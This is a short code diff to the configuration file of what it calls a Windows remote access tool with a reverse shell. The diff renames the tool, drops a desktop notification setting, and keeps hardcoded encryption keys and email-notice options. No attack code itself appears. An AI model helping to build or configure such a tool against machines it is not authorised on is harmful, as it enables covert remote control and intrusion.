@@ -1,10 +1,8 @@
-import win10toast
-
 from binary.encrypt_data import *
 
 
 state = {
-  'name': 'Neo',
+  'name': 'Alvin',
   'description': 'A Windows remote access tool application supporting\n'
                 + 'a whide range of powerful & easy to use commands\n'
                 + 'along with a stable reverse shell. [USE: \'HELP\']',
@@ -21,7 +19,6 @@ state = {
     'loading-animation': True,
     'encoding': 'latin-1',
     'headersize': 10,
-    'notifier': win10toast.ToastNotifier(),
     'encryption': Encryption(
                   'ksxgyRuBRJLKxjFeHD4nmxbE',
                   b'v4CuHZFzmTedBY2EBGrLRXsm'),
@@ -75,7 +72,6 @@ state = {
       }
     },
     'notices': {
-      'notice': False,
       'email-notice': False,
       'email-data': {
         'email': None,
